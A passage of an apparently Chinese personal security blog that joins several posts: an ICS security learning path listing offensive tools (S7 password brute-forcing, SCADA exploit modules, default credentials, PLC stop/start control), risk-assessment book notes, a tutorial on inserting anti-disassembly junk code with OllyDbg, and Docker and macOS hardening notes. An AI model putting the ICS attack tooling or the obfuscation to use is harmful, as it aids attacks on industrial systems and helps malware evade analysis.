PLC应用技术》\n4……\n\n\n\n\n工业控制系统的组态和编程\n目的：了解PLC的架构与特点，认识PLC的硬件及网络组态、学习PLC程序的基础编写，使用TIA对S7-300进行硬件组态和PLC编程。\n学习方法：学会控制器的组态方法，多看说明文档，能够读懂简单的梯形图控制逻辑和其他的基于IEC61131-3的五种工控编程语言，并进行简单的编程，使用真实的PLC设备进行实操，如国内外的PLC，西门子、施耐德、ABB、和利时、大工计控、优稳……（一般入门都是从西门子的PLC开始）设备能够跑起来是第一步，接下来就可以做一些事了。\n\n\n\n\n常用的工业控制系统协议分析\n要求：分析常用的工业以太网协议，如Modbus、S7comm、IEC61850、EtherNet/IP、DNP3、EPA等等协议，了解这些工业以太网协议的协议规范和存在的安全性问题。\n学习方法：有真实设备的可以直接使用真实设备进行分析、无真实设备的可以从网上下载相关的协议数据包进行离线分析，通过对协议的不断了解，要形成对这些协议的模糊测试工具。\n\n\n\n\n工控软硬件漏洞挖掘\n工业控制系统的漏洞挖掘主要包含三部分，上位机软件漏洞挖掘、工控协议的漏洞挖掘，控制器设备固件漏洞挖掘。其中最简单的是工控协议漏洞挖掘，上手比较快，需要具备一定的工控协议逆向能力，其他两方面需要一定的基础才能精心研究。\n学习方法：首先对协议进行分析，然后编写模糊测试脚本，最后进行测试和分析。开始研究是可以找一些已有的漏洞，先复现他的攻击过程，在分析器攻击机理，从而能够举一反三，发掘0day漏洞。\n\n\n\n工控系统攻击工具使用\n想要做一些工控安全的研究，光靠自己琢磨效率低下，需要借助前人已有的成果进行研究和学习。其中涉及到很多实用的工具，我们需要建立自己的工具集，这里列出一些常用的工具：\n（1）S7 Client Demo开源的S7协议库”snap7“基础上进行开发的，主要支持西门子的S7-300/s7-400设备，可以直接连接西门子的控制器，获取控制器上的设备信息（如固件版本，块信息等），还可以直接操作控制器的CPU的启停。\n（2）PLCSCAN、NMAP中的工控设备扫描模块通过探测设备，获取关于设备的供应商类型、模块信息等，目前仅支持S7协议与MODBUS协议。\n（3）ISF该框架主要使用Python语言开发，集成了ShadowBroker释放的NSA工具Fuzzbunch攻击框架，是一款适合工控漏洞利用的框架。其中集成很多常用的针对工控安全的攻击集。\n（4）GrassMarlinGRASSMARLIN是一款由美国国家安全局开发的，能够帮助运维工程师在IP网络上发现并编目监控和数据采集系统（SCADA）和工业控制系统（ICS）主机的开源软件工具，也被称为被动网络映射器。其数据源十分多样化，包括PCAP文件、路由器和交换机配置文件、CAM表以及实时网络数据包的捕获。该工具能够自动识别可用网络，生成网络拓扑，实现主机间通信的可视化，还能够展示从主机通信中所提取的元数据。\n（5）S7-Brute-OfflineS7密码离线暴力破解工具。\n（6）SCADA_Metasploit_Modules列举了MSF上所有的针对工业控制系统的漏洞脚本。\n（7）Scada_Password列举了工业控制系统中的常见的用户和密码。\n（8）SmodModbus模糊测试工具。\n（9）PLCinject\n（10）Modscan\n（11）…\n这里就不一一列举了，用到的使用自己去找吧，最后我这里给出几个github上对工控资源整合的网站：\nhttps://github.com/zhangdebiao/icsmaster\nhttps://github.com/zhangdebiao/ICS-Security-Tools\nhttps://github.com/zhangdebiao/awesome-industrial-control-system-security    FREEBUF\n这几个链接中整合了国内外和工控安全相关的顶会文章，工控系统的利用脚本、常用的攻击工具、工控协议相关的数据包和协议文档等等。","tags":["个人总结"],"categories":["工控"]},{"title":"（读书笔记）工业控制系统风险评估","url":"/2021/01/25/工业控制系统风险评估/","content":"\n## 第二篇：工业控制系统风险评估\n\n本篇将从一个较高的层次来讨论风险评估过程中的各个步骤，对于工控系统特有的步骤、技巧和方法，还将做进一步的深入探讨。\n\n<!-- more -->\n\n### 工控系统风险评估入门\n\n风险评估通常被称为“差距分析”、“审计”和“脆弱性评估”。\n\n#### 难以确定的工控系统“风险度量标准”\n\n一套“均码”的度量标准根本行不通，各个公司针对自己的环境制定出自己独有的评分标准\n\n#### 风险评估标准\n\n现有很多公认的风险评估标准，然而大多数这些标准文档适用于信息安全风险。没有考虑到与运营安全风险相关的细节和差异。\n\n![image-20191022173354951](https://tva1.sinaimg.cn/large/006y8mN6ly1g8741cv9oaj31ms0rsu08.jpg)\n\n![image-20191022173418032](https://tva1.sinaimg.cn/large/006y8mN6ly1g8741rejezj332b0rs4qp.jpg)\n\n可以看出可用的风险评估标准数量多、使用复杂，并且缺乏针对工控系统的适用性。\n\n#### 工控系统风险评估中评价和测量的内容\n\n许多关于工业互联网安全的探讨往往最终都会落在功能安全上（safety），因为功能安全是系统运行的基石之一。\n\n功能安全是工控系统安全的主要目标，并且也应该是工控系统安全的主要目标。但是，在考虑风险缓解策略时，功能安全不应该是唯一的动力；同时也不应该认为信息安全必然带来功能安全。此外，当发生网络攻击试图导致安全事件时，功能安全系统并不一定就会确保功能安全事件不会发生。\n\n“合规性并不等于安全性”\n\n均衡的工控系统风险评估策略应当同时考虑到功能安全和操作安全，以及安全控制措施和脆弱性。\n\n事实上，一次综合风险评估很大程度上就是一次威胁建模。\n\n风险的定义：\n\n![image-20191022175437745](https://tva1.sinaimg.cn/large/006y8mN6ly1g874mye1pzj33340ff79d.jpg)\n\n风险评估旨在通过对之前定义中所强调的属性进行评估来确定风险等级。下面逐一来说明属性是什么：\n\n![image-20191022210626443](https://tva1.sinaimg.cn/large/006y8mN6ly1g87a6hp8mjj30v10rs1kx.jpg)\n\n对风险进行评估与度量的效果越好，风险缓解策略的效率与成本效益也就越高。\n\n#### 工控系统风险评估过程概述\n\n将收集到的所有信息聚集起来并同适当的风险属性建立关联，进而组合成“攻击树”，最终用于构建可行的风险场景。\n\n下图展现了一个全面的风险评估过程所涉及的三个主要阶段：\n\n![image-20191022211634960](https://tva1.sinaimg.cn/large/006y8mN6ly1g87ah1n1d1j31la0rstyw.jpg)\n\n这些所有的步骤致力于实现风险评估共同的关键功能或目标，这些功能包括：\n\n![image-20191022211853006](https://tva1.sinaimg.cn/large/006y8mN6ly1g87ajfwucuj332s0rs1kv.jpg)\n\n下表描述了每个阶段的目标以及同每个阶段的相关联风险属性。\n\n![image-20191022212123245](https://tva1.sinaimg.cn/large/006y8mN6ly1g87am1og6cj31km0rs7wh.jpg)\n\n### 工控系统风险评估过程步骤\n\n下图说明了所涉及的每一个步骤以及步骤与整体风险评估过程的各个阶段之间的关联：\n\n![image-20191022212537223](https://tva1.sinaimg.cn/large/006y8mN6ly1g87aqfrpkwj30ws0rsnj2.jpg)\n\n#### 第1阶段：资产识别与判定\n\n“如果你不知道自己拥有什么，那么你就无法对其实施保护。”\n\n##### 步骤1:定义业务或运营目标\n\n关联风险属性：后果、影响\n\n识别与了解业务或运营目标对于真正理解风险可能对业务带来的后果和影响至关重要。\n\n##### 步骤2:系统评定与分类\n\n关联风险属性：目标对象、后果、影响\n\n在传统IT环境中，系统（system）常用来描述“计算机系统”；在工控环境中，系统是指出于一个共同的目标而协同工作的一组过程设备、处理装置及计算机\n\n##### 步骤3:资产识别\n\n关联风险属性：目标对象、攻击向量\n\n![image-20191022213628610](https://tva1.sinaimg.cn/large/006y8mN6ly1g87b1qqorhj33340hab29.jpg)\n\n###### 命令行主机识别技术\n\n1.arping 借助工具\n\n2.arp-scan 扫描工具\n\n这两个工具的缺点之一在于他们只会告诉你对于某一IP地址是否存在活动主机或设备，要想知道具体是什么类型的设备，还要使用在线工具查找MAC地址。此时如果使用了VMWare就查不出来。\n\n有一个工具提供更加可靠且完全被动的选择，那就是p0f，一种远程操作系统指纹被动识别工具。他的一个缺点是，对于工控协议和设备的支持还不完善。\n\n###### 商业被动资产识别工具\n\n3.GRASSMARLIN\n\n美国国家安全局发布的工具，免费且开源。\n\n##### 步骤4:网络拓扑与数据流审查\n\n关联风险属性：目标对象、攻击向量\n\n网络拓扑图不仅对于正确识别资产非常重要，对于识别通信路径和数据流也同样非常重要，进而有助于攻击向量的识别\n\n在工控环境中采用自动化的方式进行绘制有几个缺点，用于网络发现的传统方法通常会主动将流量引入到正在评估的网络上。其次这些工具大多需要长期的部署并应用。\n\n强烈建议使用数据流（NetFlow）分析工具\n\n下面列出了进行NetFlow分析时用到的其他的一些工具：\n\n![image-20191023083109151](https://tva1.sinaimg.cn/large/006y8mN6ly1g87tyx9gskj32as0rs1kx.jpg)\n\n##### 步骤5:风险预筛\n\n关联风险项：后果、影响\n\n由美国国安部开发的网络安全评估工具（CSET）能够帮助简化该过程并提高该过程的自动化程度。\n\n#### 第2阶段：脆弱性识别与威胁建模\n\n脆弱性识别，也称为网络脆弱性评估（CVA）或者安全脆弱性评估（SVA）\n\n##### 步骤6:安全策略审查\n\n关联风险属性：脆弱性、威胁向量\n\n大多数机构都会制定或完备简单的安全策略。网络安全策略是保障其安全状态的基线（baseline）\n\n通常安全策略都会存在薄弱环节\n\n以下是一个十分有参考价值的基线列表：\n\n![image-20191023184050860](https://tva1.sinaimg.cn/large/006y8mN6ly1g88bld299wj32d10rsb29.jpg)\n\n![image-20191023184131310](https://tva1.sinaimg.cn/large/006y8mN6ly1g88bm0xpjaj30yl0rstww.jpg)\n\n##### 步骤7:控制分析（标准审计、差距分析）\n\n关联风险属性：脆弱性\n\n控制分析步骤也被大多数人看作是针对某一标准或策略展开的传统“差距分析”或“审计”工作，并且这一步骤也是大多数“传统”风险评估的中心工作。\n\n##### 步骤8:网络脆弱性评估（CVA）\n\n关联风险属性：目标对象、威胁向量、威胁事件\n\n![image-20191023184623710](https://tva1.sinaimg.cn/large/006y8mN6ly1g88br397bqj33340dc1kx.jpg)\n\n这一步骤主要考虑几种漏洞评估方法：\n\n###### （1）漏洞映射\n\n漏洞映射就是将应用程序、操作系统和固件版本同漏洞数据库中所包含的已知漏洞进行手工匹配的过程，漏洞数据库包括：\n\n![image-20191023184910378](https://tva1.sinaimg.cn/large/006y8mN6ly1g88btyuhusj33340ox7wh.jpg)\n\n###### （2）配置审查\n\n配置审查就是对设备、系统和主机配置进行审查的过程，以寻访可能导致风险的、防护水平较弱的配置或错误的配置。\n\n当前主要的有：\n\n![image-20191023185153766](https://tva1.sinaimg.cn/large/006y8mN6ly1g88bwsyuuej33340hokeq.jpg)\n\n![image-20191023185233497](https://tva1.sinaimg.cn/large/006y8mN6ly1g88bxi1d43j311n0rs7ub.jpg)\n\n###### （3）漏洞扫描\n\n漏洞扫描使用主动扫描工具，采用将特征匹配和配置审查或补丁审查相结合的方法来识别已知的漏洞。\n\n###### （4）实时网络流量分析\n\n![image-20191023185528198](https://tva1.sinaimg.cn/large/006y8mN6ly1g88c0j6fxlj33340ll4qq.jpg)\n\n###### （5）控制分析\n\n![image-20191023185623124](https://tva1.sinaimg.cn/large/006y8mN6ly1g88c1hl3scj31k50rs7wh.jpg)\n\n![image-20191023185735592](https://tva1.sinaimg.cn/large/006y8mN6ly1g88c2qde8zj30rs0yjx5e.jpg)\n\n![image-20191023185819021](https://tva1.sinaimg.cn/large/006y8mN6ly1g88c3hjs26j30rs0yutxg.jpg)\n\n![image-20191023185856533](https://tva1.sinaimg.cn/large/006y8mN6ly1g88c44usg0j30rs0zatzv.jpg)\n\n#### 后续步骤\n\n下表列出的是本书接下来要讨论的剩余步骤，通常称之为威胁建模\n\n![image-20191023190111005](https://tva1.sinaimg.cn/large/006y8mN6ly1g88c6gjk75j31lx0rsawo.jpg)\n\n","tags":["读书笔记"],"categories":["工控"]},{"title":"花指令初步学习总结与简单实战","url":"/2021/01/25/花指令/","content":"\n### 概念\n\n我们都知道，汇编语言是机器语言的符号化。反汇编的大致过程是：首先会确定指令開始的首地址，然后依据这个指令字推断是哪个汇编语句，随后再将后面的数据反汇编出来。在这里我们可以看到该过程存在纰漏，若有人有意的将错误的机器语言放在错误的位置，则在反汇编时有可能连同后面的数据一起错误地反汇编出来，这样，我们看到的就可能是一个错误的反汇编代码。\n\n<!-- more -->\n\n花指令是利用了反汇编时单纯依据机器指令字来决定反汇编结果的漏洞。它由设计者特别构思，使反汇编的时候出错，让破解者无法清楚正确地反汇编程序的内容，迷失方向。\n\n 花指令是对反汇编的有用办法之一，正常代码添加了花指令之后，能够损坏静态反汇编的进程，使反汇编的成果呈现过错。过错的反汇编成果会形成破解者的剖析作业很多添加，进而使之不能了解程序的结构和算法，也就很难破解程序，然后到达病毒或软件维护的目的。\n\n###  分类\n\n总体上花指令分为两类，一类是可履行式花指令，另一类为不可履行式花指令（废物指令）。\n\n对于可履行式花指令，望文生义就是能够正常运转的但又不改动原始程序逻辑性的一组无用指令。这类花指令有如下特色：\n\n①能够正常运转；\n\n②不改动任何寄存器的值；\n\n③反汇编器能够正确反汇编该指令。\n\n \n\n对于不可履行式花指令，是指被刺进到原始代码中但又不改动原始程序逻辑性的一组无用字节。这类花指令有如下特色：\n\n①不行以正常运转；\n\n②不改动任何寄存器的值；\n\n③反汇编器或许会过错反汇编这些字节。\n\n###  作用\n\n正常代码添加了花指令后，能够干扰破坏正常静态反汇编的过程，增加了破解人员的分析难度，进而实现了保护软件的目的。\n\n###  基本过程\n\n我们还是以之前的helloworld小程序为例，在其中加入一段花指令进而干扰它的正常反汇编过程。\n\n首先要注意的是，添加花指令这一过程需要一块比较大的0x00区域以便于我们进行修改。我们将原程序拉入OD之中，很容易可以找到一块可用的0x00空区域。如图我们随机选择以0041FFB1为开始的一大块空白区域。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g754chjvexj30l208ydh8.jpg) \n\n随后我们使界面回到打开OD载入软件时的入口地址，从下图我们可以得知该地址为00403510。\n\n![image-20190919205708184](https://tva1.sinaimg.cn/large/006y8mN6ly1g754gmzonzj30v40b80xo.jpg) \n\n我们在反汇编窗口点击右键——转到——表达式，然后输入之前选取的空白区域起始地址0041FFB1。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g754cv3jrdj318p0u04br.jpg) \n\n我们在转入的0041FFB1地址开始，一步一步输入花指令。我们在这里使用一段比较经典的花指令。\n\n```汇编\nnop\nnop\nnop\nmov ebp,esp\npush -1\npush 111111\npush 222222\nmov eax,dword ptr fs:[0]\npush eax\nmov dword ptr fs:[0],esp\npop eax\nmov dword ptr fs:[0],eax\npop eax\npop eax\npop eax\npop eax\nmov ebp,eax\nmov eax,原入口地址\npush eax\nretn\n```\n\n注意在该程序中的“原入口地址”位置就是打开OD载入软件时的入口地址，00403510。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g754czcxknj31c40u0dik.jpg) \n\n随后在花指令的首行“0041FFB1”使用右键将此处设置为新EIP。\n\n![](https://tva1.sinaimg.cn/large/006y8mN6ly1g754firthjj30kk0hi78l.jpg)\n\n最后继续在“0041FFB1”处右键，选择用OllyDump脱壳调试进程，并在弹出的选框中选择脱壳，并将该EXE文件保存。此时加花过程结束，我们双击发现运行正常。\n\n \n\n ","tags":["个人总结","花指令"],"categories":["二进制"]},{"title":"使用Docker配置Nginx+PHP+MySQL","url":"/2021/01/25/环境准备/","content":"\n\n\n**任务目标**：准备学习环境，学习Web服务器的搭建过程，并做相应的加固学习\n\n**操作系统**：MacOS Catalina 10.15\n\n<!-- more -->\n\n**报告内容**：\n\n## 为电脑安装Docker\n\nmacOS 我们可以使用 Homebrew 来安装 Docker。\n\n```\n$ brew cask install docker\n```\n\n![image-20190722111319355](http://ww2.sinaimg.cn/large/006y8mN6ly1g67e4zlnb6j30uy06g0uo.jpg)\n\n在Docker环境安装成功之后，就可以开始进行环境的配置了。\n\n# Docker安装配置Nginx\n\n首先需要拉取Docker Hub上的nginx镜像，我们可以使用以下命令\n\n```\n$ docker pull nginx\n```\n\n随后我们在Docker images里就可以看到Nginx的镜像\n\n![image-20190723174253192](http://ww3.sinaimg.cn/large/006y8mN6ly1g67e4y4r0rj30uy0a876m.jpg)\n\n以下命令使用 NGINX 默认的配置来启动一个 Nginx 容器实例：\n\n```\n$ docker run --name Fstark-nginx -p 8081:80 -d nginx\n```\n\n- `Fstark-nginx` 容器名称。\n- the `-d`设置容器在在后台一直运行。\n- the `-p` 端口进行映射，将本地 8081 端口映射到容器内部的 80 端口。\n\n此时我们就可以使用Docker ps命令查看容器是否真的在运行，以及其运行状态。\n\n![image-20190723174742160](http://ww3.sinaimg.cn/large/006y8mN6ly1g67e4xht2wj31kg03u0tx.jpg)\n\nPORTS 部分表示端口映射，本地的 8081 端口映射到容器内部的 80 端口。\n\n在浏览器中打开 **http://localhost:8081**，效果如下：\n\n![image-20190723175223816](http://ww1.sinaimg.cn/large/006y8mN6ly1g67e4yvgzuj312508y403.jpg)\n\n既证明nginx安装成功，随后我们要进行nginx的进一步部署。\n\n首先，创建目录 nginx, 用于存放后面的相关东西。\n\n```\n$ mkdir -p ~/nginx/www ~/nginx/logs ~/nginx/conf\n```\n\n拷贝容器内 Nginx 默认配置文件到本地当前目录下的 conf 目录，容器 ID 可以查看 **docker ps** 命令输入中的第一列：\n\n```\ndocker cp 66e57416972d:/etc/nginx/nginx.conf ~/nginx/conf\n```\n\n- **www**: 目录将映射为 nginx 容器配置的虚拟目录。\n- **logs**: 目录将映射为 nginx 容器的日志目录。\n- **conf**: 目录里的配置文件将映射为 nginx 容器的配置文件。\n\n部署命令如下：\n\n```\n$ docker run -d -p 8082:80 --name Fstark-nginx-web -v ~/nginx/www:/usr/share/nginx/html -v ~/nginx/conf/nginx.conf:/etc/nginx/nginx.conf -v ~/nginx/logs:/var/log/nginx nginx\n```\n\n命令说明：\n\n- **-p 8082:80：** 将容器的 80 端口映射到主机的 8082 端口。\n- **--name Fstark-nginx-web：**将容器命名为 Fstark-nginx-web。\n- **-v ~/nginx/www:/usr/share/nginx/html：**将我们自己创建的 www 目录挂载到容器的 /usr/share/nginx/html。\n- **-v ~/nginx/conf/nginx.conf:/etc/nginx/nginx.conf：**将我们自己创建的 nginx.conf 挂载到容器的 /etc/nginx/nginx.conf。\n- **-v ~/nginx/logs:/var/log/nginx：**将我们自己创建的 logs 挂载到容器的 /var/log/nginx。\n\n启动以上命令后进入 ~/nginx/www 目录：\n\n```\n$ cd ~/nginx/www\n```\n\n创建 index.html 文件，内容如下：\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<title>Fstark的信安之路第一步</title>\n</head>\n<body>\n    <h1>我的第一个标题</h1>\n    <p>我的第一个段落。</p>\n</body>\n</html>\n```\n\n输出结果为：\n\n![image-20190723180542509](http://ww3.sinaimg.cn/large/006y8mN6ly1g67e50kc34j30q80fumym.jpg)\n\n# Docker安装PHP\n\n查找Docker Hub上的php镜像，这里我们拉取官方的镜像,标签为5.6-fpm\n\n```\ndocker pull php:5.6-fpm\n```\n\n等待下载完成后，我们就可以在本地镜像列表里查到REPOSITORY为php,标签为5.6-fpm的镜像。\n\n这时就可以启动PHP了\n\n```\ndocker run --name  myphp-fpm -v ~/nginx/www:/www  -d php:5.6-fpm\n```\n\n命令说明：\n\n- **--name myphp-fpm** : 将容器命名为 myphp-fpm。\n- **-v ~/nginx/www:/www** : 将主机中项目的目录 www 挂载到容器的 /www\n\n创建 ~/nginx/conf/conf.d 目录：\n\n```\nmkdir ~/nginx/conf/conf.d \n```\n\n在该目录下添加 **~/nginx/conf/conf.d/Fstark-php.conf** 文件，内容如下：\n\n```\nserver {\n    listen       80;\n    server_name  localhost;\n\n    location / {\n        root   /usr/share/nginx/html;\n        index  index.html index.htm index.php;\n    }\n\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n        root   /usr/share/nginx/html;\n    }\n\n    location ~ \\.php$ {\n        fastcgi_pass   php:9000;\n        fastcgi_index  index.php;\n        fastcgi_param  SCRIPT_FILENAME  /www/$fastcgi_script_name;\n        include        fastcgi_params;\n    }\n}\n```\n\n配置文件说明：\n\n- **php:9000**: 表示 php-fpm 服务的 URL，下面会具体说明。\n- **/www/**: 是 **myphp-fpm** 中 php 文件的存储路径，映射到本地的 ~/nginx/www 目录。\n\n启动 nginx：\n\n```\ndocker run --name Fstark-php-nginx -p 8083:80 -d \\\n    -v ~/nginx/www:/usr/share/nginx/html:ro \\\n    -v ~/nginx/conf/conf.d:/etc/nginx/conf.d:ro \\\n    --link myphp-fpm:php \\\n    nginx\n```\n\n- **-p 8083:80**: 端口映射，把 **nginx** 中的 80 映射到本地的 8083 端口。\n- **~/nginx/www**: 是本地 html 文件的存储目录，/usr/share/nginx/html 是容器内 html 文件的存储目录。\n- **~/nginx/conf/conf.d**: 是本地 nginx 配置文件的存储目录，/etc/nginx/conf.d 是容器内 nginx 配置文件的存储目录。\n- **--link myphp-fpm:php**: 把 **myphp-fpm** 的网络并入 **nginx**，并通过修改 **nginx** 的 /etc/hosts，把域名 **php** 映射成 127.0.0.1，让 nginx 通过 php:9000 访问 php-fpm。\n\n接下来我们在 ~/nginx/www 目录下创建 index.php，代码如下：\n\n```\n<?php\necho phpinfo();\n?>\n```\n\n浏览器打开 **http://127.0.0.1:8083/index.php**，显示如下：\n\n![image-20190725134655475](http://ww3.sinaimg.cn/large/006y8mN6ly1g67e5218caj31pb0u0qbg.jpg)\n\n如图可知，php配置成功。\n\n# Docker安装MySQL\n\n查找Docker Hub上的mysql镜像，这里我拉取官方的镜像,标签为5.6\n\n```\ndocker pull mysql:5.6\n```\n\n等待下载完成后，我们就可以在本地镜像列表里查到REPOSITORY为mysql,标签为5.6的镜像。随后运行容器\n\n```\ndocker run -p 3306:3306 --name mymysql -v $PWD/conf:/etc/mysql/conf.d -v $PWD/logs:/logs -v $PWD/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.6\n```\n\n命令说明：\n\n- **-p 3306:3306**：将容器的 3306 端口映射到主机的 3306 端口。\n- **-v $PWD/conf:/etc/mysql/conf.d**：将主机当前目录下的 conf/my.cnf 挂载到容器的 /etc/mysql/my.cnf。\n- **-v $PWD/logs:/logs**：将主机当前目录下的 logs 目录挂载到容器的 /logs。\n- **-v $PWD/data:/var/lib/mysql** ：将主机当前目录下的data目录挂载到容器的 /var/lib/mysql 。\n- **-e MYSQL_ROOT_PASSWORD=123456：**初始化 root 用户的密码。\n\n![截屏2019-07-25下午2.23.07](http://ww4.sinaimg.cn/large/006y8mN6ly1g67e501gtgj31t2066dj1.jpg)\n\n```\ndocker run --name myadmin -d --link mymysql:db -p 8080:80 phpmyadmin/phpmyadmin\n```\n\n此时可以连接到数据库\n\n![image-20190725145426373](http://ww1.sinaimg.cn/large/006y8mN6ly1g67e51492aj316y0u0afd.jpg)\n\n# Macos安全加固\n\n安全加固（Security Reinforce，SR）对主机、网络设备、应用系统、操作系统、中间件、数据库等进行全面的基线加固和组件升级，针对系统存在的高危漏洞和安全隐患等提供安全加固方案，整体上提高系统的安全防御能力。   我查阅了阿里云的官方安全公告和技术，嘶吼论坛里的资料以及谷歌搜索的结果，整合了Mac os操作系统的一些安全加固。\n\n**(1) 安全启动**\n\n在2018年以后的MacBook主机中，通过TouchBar内部新安装的T2芯片（包括Secure Enclave），支持安全启动（Secure Boot）功能。要检查是否已经启用安全启动，需要在开机时同时按下COMMAND + R键。在输入固件密码后，可以访问菜单栏中的“启动安全实用程序”（Startup Security Utility）。如果MacBook中带有T2芯片（TouchBar），则可以看到“安全启动”（Secure Boot）和“外部启动”（External Boot）两个选项。我们强烈建议，在需要保证较高安全性的情况下，应选择“安全启动”。在禁止从外部介质启动时，应选择“外部启动”。\n\n<font color=red>***这一条不太理解，因为我的电脑是2015年配置的，不含此芯片***</font> \n\n**(2) 终端保护**\n\n默认情况下，macOS已经具有保护机制，例如：XProtect（恶意软件检测）、Secure Boot、代码签名验证、沙箱应用程序和系统完整性保护。此外，如果启用了MDM（例如在macOS服务器上），则可以通过不同的策略配置设备和管理设备。如果需要安装其他终端保护工具，应该评估该工具是否支持macOS设备。\n\n<font color=red>***对终端进行保护，防止第三方的恶意输入。计算机使用人员离开后不会被其他人员或者黑客木马操作自己的机子，减少安全隐患。保证机密文档，只有授权用户才能访问，其他用户不经过授权无法访问和查看文件夹中的文件；***</font> \n\n**(3) 日志和事件收集**\n\n管理员可以根据实际需要，配置macOS的审计框架。通过/Applications/Utilities/Console.app，可以查看到整合后的日志。默认情况下，macOS支持以syslogd守护程序，通过UDP/514端口发送日志。但是，由于缺乏对TLS/SSL的支持，建议不要使用此项功能，预计Apple很快就会弃用这项功能。如果您所在的企业环境中不支持包含代理的macOS SISM，建议可以从本地整合日志，并且避免通过网络发送未经加密的日志。借助macOS提供的日志实用程序，可以以安全的方式获取此类日志，只需日志收集服务器的接收端打开TCP端口（需支持TLS/SSL）。例如，在MacBook上执行以下命令，可以通过加密通道将每个失败的sudo尝试发送到日志服务器：\n\n```\nlog stream --style syslog --predicate 'process == \"sudo\" and eventMessage contains \"incorrect password\"' | openssl s_client -host <RemoteServer> -port <Port>\n```\n\n日志服务器将收到类似的日志消息，如下所示：\n\n```\nFiltering the log data using \"process == \"sudo\" AND composedMessage CONTAINS \"incorrect password\"\"\nTimestamp                       (process)[PID]\n2018-10-24 17:23:33.842651+0200  localhost sudo[2002]:   MacBook_ERNW : 2 incorrect password attempts ; TTY=ttys002 ; PWD=/Users/MacBook_ERNW ; USER=root ; COMMAND=su\n```\n\n可以使用macOS登录项，来自动启动日志流。此外，管理员可以根据需要，使用过滤器来过滤实际需要的日志。\n\n<font color=red>***出现任何问题，可以通过日志查找根源，发现问题，进而解决问题***</font> \n\n**(4) 移动设备管理**\n\n将MacBook与移动设备管理系统（MDM，如macOS服务器）连接，可以强制操作系统必须部署指定的策略。此外，可以通过MDM解决方案来实现部署证书和连接到活动目录（Active Directory）。\n\n**(5) 确保标准帐户和默认帐户的安全性**\n\nmacOS会始终强制用户创建新帐户。即使用户以管理员权限帐户运行，也不会拥有与“root”相同的权限，这就是macOS称之为系统完整性保护（SIP）的机制。SIP将拒绝使用者对系统目录（例如：/System）的任何更改。\n\n<font color=red>***防止root权限出现一些安全问题***</font> \n\n**(6) 用户权限分离**\n\n建议用户使用不同的帐户，分别进行管理和日常活动。并且，应该为特殊任务和系统维护创建一个具有管理员权限的帐户，为日常使用过程创建一个普通帐户，从而避免攻击者快速提升权限。\n\n<font color=red>***防止root权限出现一些安全问题***</font> \n\n**(7) 确保密码安全**\n\n应确保所有用户都使用强密码，强密码的具体定义如下：\n\n最小密码长度至少为8个字符；\n\n密码必须同时包含小写字母、大写字母、数字和特殊字符；\n\n不得使用任何默认密码；\n\n密码必须具有6个以上不同的字符；\n\n同一个密码最多使用180天；\n\n用户名不得作为密码的一部分；\n\n新设置的密码，与最近5次设置的历史密码不能相同。\n\n<font color=red>***密码安全十分重要，房子爆破和被入库，需要及时的更换密码***</font> \n\n**(8) 强制密码安全策略（重要）**\n\n管理员可以使用命令行工具pwpolicy，来强制实施密码策略。以下命令可以强制执行上述策略：\n\n```\npwpolicy -u -setpolicy \"minChars=8 requiresAlpha=1 requiresNumeric=1 maxMinutesUntilChangePassword=259200 usingHistory=5 usingExpirationDate=1 passwordCannotBeName=1 requiresMixedCase=1 requiresSymbol=1\"\n```\n\n<font color=red>***强制使用密码，虽然麻烦，但是增强了安全性***</font> \n\n**(9) 双因素身份验证（可选）**\n\n从macOS 10.11和iOS 9开始，这些Apple设备就内置了双因素身份验证机制，可以保护用户的Apple ID。如果访问了任何需要登录Apple ID的内容，身份验证码就会被推送到另一台安装了macOS 10.11以上版本或iOS 9以上版本系统的设备上。这一过程可能会影响用户的macOS安装，因为可以通过Apple ID重置设备的密码。如果用户需要使用Apple ID执行各种任务，那么建议使用双因素身份验证。\n\n<font color=red>***两步验证，大大增强了ID的安全性***</font> \n\n**(10) 自动登录和用户列表（重要）**\n\n在“系统偏好设置”（System Perferences）中，选择“用户和组”（Users & Groups），选择“登录选项”（Login Options），将“自动登录”（Automatic Login）设置为禁用，将“显示登录窗口”（Display Login Window）设置为“用户名和密码”（Name and Password），并禁用密码提示（Password Hints）。\n\n<font color=red>***禁用用户列表，这样会降低攻击者正确猜测登录凭据的可能性***</font> \n\n**(11) 登录导语（可选）**\n\n可以设置登录导语（Login Banner），从而在登录时显示包含策略的信息。\n\n```\nsudo defaults write /Library/Preferences/com.apple.loginwindow LoginwindowText “text”\n```\n\n<font color=red>***起到提示性的作用***</font> \n\n**(12) 访客帐户（重要）**\n\n应该始终禁用访客帐户的所有内容，并且停用访客账户。\n\n在“系统偏好设置”中，选择“用户和组”，确保已经禁用访客账户（Guest Users）。\n\n<font color=red>***停用访客访问，减小被侵入进而提权的风险***</font> \n\n**(13) 限制Sudoers文件（重要）**\n\n要限制宽限期（Grace Period）并限制为单个ttys，应使用visudo命令，编辑/etc/sudoers，添加以下内容：\n\n```\nDefaults timestamp_timeout=0\nDefaults tty_tickets\n```\n\n**(14) 自动锁定登录钥匙串（可选）**\n\n打开钥匙串访问（Keychain Access），选择登录钥匙串。选择“编辑”（Edit），更改钥匙串设置“登录”。将“不活动[…]分钟后锁定”（Lock after […] minutes）的数值设置为10。勾选“睡眠时锁定”（Lock when sleeping）选项。\n\n注意：自动锁定钥匙串将会影响用户体验，每个锁定守护进程（例如：Wi-Fi服务）都需要解锁。因此，Wi-Fi环境下的自动夜间备份将会受到影响。\n\n<font color=red>***登录钥匙串，许多登录窗口会自动填充密码，对用户十分危险***</font> \n\n**(15) 修复当前系统漏洞（重要）**\n\n在执行本指南中的加固措施之前，强烈建议先将当前系统升级到最新且已经安装补丁的状态。可以通过“Apple菜单” – “App Store” – “升级”（Updates）来检查当前系统的更新情况。\n\n或者，也可以在命令行中输入以下命令：\n\n```\n$ softwareupdate -l\n```\n\n<font color=red>***及时升级系统，修补漏洞，十分重要***</font> \n\n**(16) 自动更新（重要）**\n\n建议始终启用自动更新，以自动向系统提供最新的安全修复程序。可以通过以下命令检查是否启用此设置：\n\n```\n$ defaults read /Library/Preferences/com.apple.SoftwareUpdate 